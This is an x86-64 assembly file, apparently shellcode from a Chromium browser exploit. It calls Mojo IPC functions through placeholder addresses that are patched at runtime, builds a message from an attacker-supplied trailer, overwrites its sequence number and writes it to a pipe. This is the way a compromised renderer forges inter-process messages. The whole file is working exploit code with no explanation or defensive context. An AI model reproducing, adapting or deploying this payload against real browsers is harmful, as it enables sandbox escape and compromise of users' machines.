BITS 64

start:
	; int3
	push rbp
	mov rbp, rsp
	sub rsp, 0x8
	xor rdi, rdi ; options NULL
	lea rsi, [rel msghandle] ; message_handle
	mov rax, 0x4242424242424242 ; MojoCreateMessageImpl
	call rax

	mov rdi, qword[rel msghandle] ; msghandle
	xor rsi, rsi
	mov esi, dword[rel trailer_length] ; payload_size
	lea rdx, [rel handles]; handles
	mov rcx, 2; num_handles
	lea r8, [rel options] ; options 
	lea rax, [rel num_bytes]
	push rax
	lea r9, [rel bufferptr]
	mov rax, 0x4444444444444444 ; MojoAppendMessageDataImpl
	call rax
	cmp rax, 0
	jnz debug

	mov rax, qword[rel num_bytes]
	xor rdx, rdx
	mov edx, dword[rel trailer_length]
	cmp rax, rdx
	jl debug
copy:
	xor rcx, rcx
	mov ecx, dword[rel trailer_length] ; byteLength
	mov rdi, qword[rel bufferptr] ; dest
	lea rsi, [rel trailer] ; source
	REP movsb
	
	mov rdi, qword[rel msghandle]
	mov rsi, qword[rel seq_num]
	mov qword[rdi + 0x20], rsi ; next_sequence_num_to_send

	; int3
	mov rdi, qword[rel pipehandle]
	mov rsi, qword[rel msghandle]
	xor rdx, rdx
	mov rax, 0x4545454545454545; MojoWriteMessageImpl
	call rax
	test rax, rax
	jz end
debug:
	int3
end:
	leave
	ret

msghandle:
	dq 0
bufferptr:
	dq 0
num_bytes:
	dd 0
options:
	dd 8
	dd 1 ; MOJO_APPEND_MESSAGE_DATA_FLAG_COMMIT_SIZE
seq_num:
	dq 0
handles:
	dd 0
	dd 0
pipehandle:
	dd 0
trailer_length:
	dd 0
trailer:
